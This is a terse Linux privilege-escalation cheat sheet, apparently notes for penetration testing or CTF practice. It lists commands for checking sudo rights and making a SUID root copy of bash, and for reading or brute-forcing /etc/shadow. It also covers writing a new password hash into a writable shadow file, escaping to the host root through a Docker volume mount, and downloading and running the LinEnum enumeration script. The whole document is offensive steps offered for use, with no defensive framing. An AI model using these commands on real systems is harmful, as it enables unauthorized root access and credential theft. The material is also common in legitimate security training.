				Sudo 
Can you su without a password?		       su root
are you already a sudo user?			   sudo su -
what can we run with sudo?			  sudo -l

				Spawning root shells
Create a copy of /bin/bash or /bin/sh can you call it rootbash - make sure its owned by the root user. Then use /bin/bash -p to run it

				/etc/shadow
can you read /etc/shadow? Try brute force
				
				Writeable /etc/shadow
ls -l /etc/shadow					is /etc/shadow writable
mkpasswd -m sha-512 password		

				Docker
-- get image name using 'docker ps'
-- docker run -v /:/mnt --rm -it $imagenamehere chroot /mnt sh

				LinEnum
-- wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
-- ./LinEnum.sh -t -r report.txt

				Misc
-- https://gtfobins.github.io/